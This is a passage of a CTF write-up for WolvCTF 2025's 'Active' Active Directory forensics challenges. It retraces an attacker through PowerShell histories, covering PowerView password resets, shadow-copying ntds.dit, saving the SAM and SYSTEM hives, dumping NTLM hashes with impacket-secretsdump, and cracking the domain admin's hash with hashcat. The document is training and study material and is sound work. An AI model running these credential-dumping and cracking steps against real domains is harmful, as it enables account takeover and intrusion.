+            srcset="/posts/wolvctf-2025/Pasted_image_20250319010821_hu16929530763812146262.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319010821_hu3331574975144426765.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319010821_hu4511902115121031506.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319010821_hu1442638317663471530.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1726"
+        height="988"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319010821_hu382496420493443754.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319010821_hu16831894139701377078.png 330w,/posts/wolvctf-2025/Pasted_image_20250319010821_hu382496420493443754.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319010821_hu9064219342684271656.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319010821_hu13390780524634924861.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319010733_hu1632233739125937692.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319010733_hu814651696007619953.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319010733_hu114345950042364801.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319010733_hu18369067259327430131.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3828"
+        height="2388"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319010733_hu1842185320186750509.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319010733_hu11843523782357681049.png 330w,/posts/wolvctf-2025/Pasted_image_20250319010733_hu1842185320186750509.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319010733_hu5941768681656092296.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319010733_hu7490671558864318854.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Binary walking <code>car.jpg</code> reveals another photo hidden inside. This contains James&rsquo;s password, along with the second part of the flag</p>
+<pre tabindex="0"><code>sh0uldv3_3nabl3d_s0m3_k3b3r0s_pr34th_4nd_
+</code></pre><hr>
+<h4 id="part-3-enumerating-jamess-account" class="relative group">Part 3: Enumerating James&rsquo;s Account <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#part-3-enumerating-jamess-account" aria-label="Anchor">#</a></span></h4><p>Same as before, check James&rsquo;s history</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy]
+└─$ cat james/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
+cd C:\Users\Public\Documents
+mv .\PowerView.txt .\PowerView.ps1
+powershell -ep bypass
+Import-Module .\PowerView.ps1
+Find-DomainProcess
+$NewPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force`
+Set-DomainUserPassword -Identity &#39;emily&#39; -AccountPassword $NewPassword
+$NewPassword = ConvertTo-SecureString &#39;d0nt_us3_4ll3xtendedr1ghts}&#39; -AsPlainText -Force`
+Set-DomainUserPassword -Identity &#39;patrick&#39; -AccountPassword $NewPassword
+runas /User:wolvctf\patrick cmd
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319011833_hu1705238660537251709.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319011833_hu10542174452559366227.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319011833_hu8998926463598589280.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319011833_hu14969202535101450845.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3792"
+        height="1392"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319011833_hu13407331254601735787.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319011833_hu12495798911005182679.png 330w,/posts/wolvctf-2025/Pasted_image_20250319011833_hu13407331254601735787.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319011833_hu7114384488099228988.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319011833_hu726175579044745458.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>We can see in the Bloodhound output that James has <code>AllExtendedRigts</code> to both <code>Emily</code> and <code>Patrick</code>. It appears as Patrick&rsquo;s new password is the third part of the flag:</p>
+<pre tabindex="0"><code>d0nt_us3_4ll3xtendedr1ghts}
+</code></pre><hr>
+<h4 id="final-flag-1" class="relative group">Final flag <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#final-flag-1" aria-label="Anchor">#</a></span></h4><pre tabindex="0"><code>wctf{asr3pr04st3d?_sh0uldv3_3nabl3d_s0m3_k3b3r0s_pr34th_4nd_d0nt_us3_4ll3xtendedr1ghts}
+</code></pre><hr>
+<h2 id="active-3-domain-admin" class="relative group">Active 3: Domain Admin <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#active-3-domain-admin" aria-label="Anchor">#</a></span></h2><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250324181434_hu10542465246600883492.webp 330w,/posts/wolvctf-2025/Pasted_image_20250324181434_hu12480714290239343972.webp 660w
+            
+              
+                ,/posts/wolvctf-2025/Pasted_image_20250324181434_hu14449973031434035404.webp 980w
+              
+            
+            
+              
+                ,/posts/wolvctf-2025/Pasted_image_20250324181434_hu14449973031434035404.webp 980w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="980"
+        height="1202"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250324181434_hu10432312805782796366.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250324181434_hu10482217423063097202.png 330w,/posts/wolvctf-2025/Pasted_image_20250324181434_hu10432312805782796366.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324181434.png 980w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324181434.png 980w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="challenge-description-5" class="relative group">Challenge Description <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#challenge-description-5" aria-label="Anchor">#</a></span></h3><p>Now, it&rsquo;s time to figure out how this attacker obtained administrator access on our domain! To prove you have retraced the attacker&rsquo;s steps completely, submit the domain admin&rsquo;s password as the flag. It&rsquo;s already in the flag format.</p>
+<p><code>Users_Backup.zip</code>&rsquo;s password is <code>wolvctf</code></p>
+<p><code>sha256sum:709b595d63ac9660b9c67de357337ee55ffd6658412b8c5c27b35efc05617893</code></p>
+<p><a href="https://drive.google.com/drive/folders/11MzaiPYvosPSYlKzqqAVX_muiv5p4yQA?usp=sharing" target="_blank" rel="noreferrer">https://drive.google.com/drive/folders/11MzaiPYvosPSYlKzqqAVX_muiv5p4yQA?usp=sharing</a></p>
+<h3 id="solve-5" class="relative group">Solve <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#solve-5" aria-label="Anchor">#</a></span></h3><h3 id="part-1-obtaining-jessicas-password-hash" class="relative group">Part 1: Obtaining Jessica&rsquo;s password hash <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#part-1-obtaining-jessicas-password-hash" aria-label="Anchor">#</a></span></h3><p>Lets pick up where we left off with part 2 and scan the newly taken over account, Patrick&rsquo;s</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy]
+└─$ cat patrick/Desktop/note_from_jake.txt                                                     
+If you need anything backed up you can just use my account:
+
+Password: fwa3fe8#FEwef 
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319012529_hu6759621594635281512.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319012529_hu17780300470287189478.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319012529_hu14603613746828392141.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319012529_hu9477100444568426412.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2346"
+        height="686"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319012529_hu4914810271671048650.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319012529_hu16598650982351292722.png 330w,/posts/wolvctf-2025/Pasted_image_20250319012529_hu4914810271671048650.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319012529_hu3498736181247057076.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319012529_hu1930876853751137187.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Now, lets check Jake&rsquo;s</p>
+<pre tabindex="0"><code>cat jake/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt 
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319012638_hu17819929911918381375.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319012638_hu1163919635441514604.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319012638_hu14551041297396583781.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319012638_hu2984829424668788277.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2408"
+        height="1720"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319012638_hu3054989653199543909.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319012638_hu6539719399381694567.png 330w,/posts/wolvctf-2025/Pasted_image_20250319012638_hu3054989653199543909.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319012638_hu3521638161368611670.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319012638_hu13252608553252747786.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy]
+└─$ cat jake/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt 
+cd C:\Users\Public\Downloads
+whoami
+cd C:\Users\jake\desktop
+whoami /all &gt; whoami.txt
+type .\whoami.txt
+cd C:\Users\public
+cd downloads
+diskshadow.exe /s script.txt
+diskshadow.exe /s script.txt &gt; shadow.txt
+type .\shadow.txt
+cp .\shadow.txt C:\Users\jake\desktop\shadow.txt
+del shadow.txt
+robocopy /b z:\windows\ntds . ntds.dit &gt; robo.txt
+type .\robo.txt
+dir
+del robo.txt
+cp ntds.dit C:\Users\jake\downloads
+del ntds.dit
+cd C:\Users\jake\downloads
+dir
+reg save hklm\system c:\users\jake\downloads\system.hive
+reg save hklm\sam C:\users\jake\downloads\sam.hive
+dir
+cp * C:\Users\public
+del C:\Users\public\ntds.dit
+del C:\Users\public\sam.hive
+del C:\Users\public\system.hive
+runas /User:wolvctf\jessica
+runas /User:wolvctf\jessica cmd
+</code></pre><p>We can see that they used diskshadow to perform a volume shadow copy of the NTDS, SAM hive, and SYSTEM hive. Let&rsquo;s use <code>impacket</code> to dump those secrets</p>
+<pre tabindex="0"><code>impacket-secretsdump -ntds ntds.dit -system system.hive -sam sam.hive LOCAL
+</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[~/…/challenge/Users - Copy/jake/Downloads]
+└─$ impacket-secretsdump -ntds ntds.dit -system system.hive -sam sam.hive LOCAL
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x32032d8f6ff9102e4202d192c152e02a
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:1b921e44ea5dfd940c004044d4ef4cae:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn&#39;t have hash information.
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: a802330d6d1dca4a57a459990af5e50e
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:1b921e44ea5dfd940c004044d4ef4cae:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b60be13c1c27a48e5c5afc10792afeab:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7f27814ee1fea90dc7495b265207db9d:::
+mssql_service:2102:aad3b435b51404eeaad3b435b51404ee:6092ca0e60d24f30d848a5def59d4753:::
+wolvctf.corp\james:4101:aad3b435b51404eeaad3b435b51404ee:4c20abe87d36b9ad715fd5671545abb5:::
+wolvctf.corp\emily:4102:aad3b435b51404eeaad3b435b51404ee:5c7a26ae4c40018fa1660cc2f1d82269:::
+wolvctf.corp\john:4103:aad3b435b51404eeaad3b435b51404ee:d24c1456aefeab3eb911c8015b9f6ce4:::
+wolvctf.corp\patrick:4104:aad3b435b51404eeaad3b435b51404ee:0311f96ce47c5cc21529fcc8375f9c2e:::
+wolvctf.corp\katherine:4105:aad3b435b51404eeaad3b435b51404ee:89218e0b151209e9d4fa0768ea72c70d:::
+wolvctf.corp\Amy:4106:aad3b435b51404eeaad3b435b51404ee:4aa4474c2886f6a796bd75eebe5ebf01:::
+wolvctf.corp\jessica:4107:aad3b435b51404eeaad3b435b51404ee:8fcdcffba18f392df7aa291527290aff:::
+wolvctf.corp\frank:4108:aad3b435b51404eeaad3b435b51404ee:b0212745c59fcf54f06ea501cd409ff5:::
+wolvctf.corp\chris:4109:aad3b435b51404eeaad3b435b51404ee:253cfc1375d39308ab1bb935b44e2010:::
+wolvctf.corp\renee:4110:aad3b435b51404eeaad3b435b51404ee:9b5109ef6dbc8086ed36a90c20aa1d48:::
+wolvctf.corp\peter:4111:aad3b435b51404eeaad3b435b51404ee:4f3cde005948d4e4fb232c35014ccafb:::
+wolvctf.corp\dan:4112:aad3b435b51404eeaad3b435b51404ee:e9d959da74f5c7590a80d635b36705a6:::
+...
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319013007_hu10142297788398688319.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319013007_hu4545385785190172546.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319013007_hu11721977256015154587.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319013007_hu7830967533857803318.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3796"
+        height="2374"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319013007_hu8802571130913503010.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319013007_hu2288022426749730337.png 330w,/posts/wolvctf-2025/Pasted_image_20250319013007_hu8802571130913503010.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319013007_hu14944241194353760124.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319013007_hu16369688537543650547.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>From our bloodhound output, we know jessica is the domain admin. We want to focus on her NTLM hash:</p>
+<pre tabindex="0"><code>wolvctf.corp\jessica:4107:aad3b435b51404eeaad3b435b51404ee:8fcdcffba18f392df7aa291527290aff:::
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319013405_hu15420679288239438729.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319013405_hu2680036238248903979.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319013405_hu6025472891589929622.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319013405_hu9423666574454847767.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2086"
+        height="1066"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319013405_hu13653939785619621314.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319013405_hu7911765561651807685.png 330w,/posts/wolvctf-2025/Pasted_image_20250319013405_hu13653939785619621314.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319013405_hu13901456478886989262.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319013405_hu13622267055454106806.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<pre tabindex="0"><code>8fcdcffba18f392df7aa291527290aff
+</code></pre><hr>
+<h4 id="cracking-jessicas-password-hash" class="relative group">Cracking Jessica&rsquo;s password hash <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#cracking-jessicas-password-hash" aria-label="Anchor">#</a></span></h4><p>If you want to view the raw bloodhound data, it will show the description for the <code>Domain Admins</code> Group that Jessica is a part of
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319013740_hu17680148321043002436.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319013740_hu14961247698531067773.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319013740_hu268213896086246037.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319013740_hu12837505805153546174.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3816"
+        height="2384"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319013740_hu14354460124738884873.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319013740_hu9708282870208881704.png 330w,/posts/wolvctf-2025/Pasted_image_20250319013740_hu14354460124738884873.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319013740_hu7702303768984910075.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319013740_hu3231874837506024583.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<pre tabindex="0"><code>Members who are part of this group have passwords w then a c then a t and an f, curly bracket left, &#39;bloodhound_is_cool_&#39; (but all the &#39;o&#39;s are &#39;0&#39;s), then a city in all lowercase appended by 3 numbers (secret only you know),  right curly bracket
+</code></pre><p>Take a word list that has a lot of cities, as such:
+<a href="https://github.com/kkrypt0nn/wordlists/blob/main/wordlists/security_question_answers/cities.txt" target="_blank" rel="noreferrer">https://github.com/kkrypt0nn/wordlists/blob/main/wordlists/security_question_answers/cities.txt</a></p>
+<p>Lets modify the wordlist</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;cities.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cities</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">formatted_cities</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">city</span> <span class="ow">in</span> <span class="n">cities</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">city</span> <span class="o">=</span> <span class="s2">&#34;wctf{bl00dh0und_is_c00l_&#34;</span> <span class="o">+</span> <span class="n">city</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">formatted_cities</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">city</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;cities_wordlist.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">formatted_city</span> <span class="ow">in</span> <span class="n">formatted_cities</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">formatted_city</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Formatted cities have been written to cities_wordlist.txt&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>And crack using a hashcat masking rule to append 3 digits to the end of it</p>
+<pre tabindex="0"><code>hashcat -a 6 -m 1000 jessica.hash cities_wordlist.txt &#34;?d?d?d}&#34;
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250319014210_hu18310141419217713959.webp 330w,/posts/wolvctf-2025/Pasted_image_20250319014210_hu3792725145808214118.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319014210_hu13348088274545961035.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250319014210_hu13853306477872718246.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2824"
+        height="1102"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250319014210_hu6938990369024880786.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250319014210_hu12320484381154805381.png 330w,/posts/wolvctf-2025/Pasted_image_20250319014210_hu6938990369024880786.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319014210_hu14045276258623406882.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250319014210_hu13389073938804676877.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/ctf/Active]
+└─$ hashcat -a 6 -m 1000 jessica.hash cities_wordlist.txt &#34;?d?d?d}&#34; 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i7-1280P, 1424/2913 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+INFO: All hashes found as potfile and/or empty entries! Use --show to display them.
+
+Started: Wed Mar 19 01:41:52 2025
+Stopped: Wed Mar 19 01:41:53 2025
+                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/ctf/Active]
+└─$ hashcat -a 6 -m 1000 jessica.hash cities_wordlist.txt &#34;?d?d?d}&#34; --show
+8fcdcffba18f392df7aa291527290aff:wctf{bl00dh0und_is_c00l_votuporanga985}
+</code></pre><p>Flag:</p>
+<pre tabindex="0"><code>wctf{bl00dh0und_is_c00l_votuporanga985}
+</code></pre><h2 id="active-video-walkthrough" class="relative group">Active Video Walkthrough <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#active-video-walkthrough" aria-label="Anchor">#</a></span></h2><p>Video to show the attacker&rsquo;s POV to create the Active challenges</p>
+
+
+    
+    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/IEn8gESZ00g?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
+      ></iframe>
+    </div>
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+      
+      
+        
+        
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+      
+    >
+      
+      
+      
+      
+      <img
+        width="717"
+        height="717"
+        class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+        alt="dree"
+        loading="lazy" decoding="async"
+        
+          src="/img/author_hu2515200946889239367.jpg"
+          srcset="/img/author_hu5754712382128878614.jpg 330w,/img/author_hu2515200946889239367.jpg 660w
+          
+            ,/img/author.jpg 717w
+          
+          
+            ,/img/author.jpg 717w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+      
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          dree
+        </div>
+      
+      
+        <div class="text-sm text-neutral-700 dark:text-neutral-400">i hack things</div>
+      
+      <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="mailto:dree.31415@gmail.com"
+          target="_blank"
+          aria-label="Email"
+          rel="me noopener noreferrer"
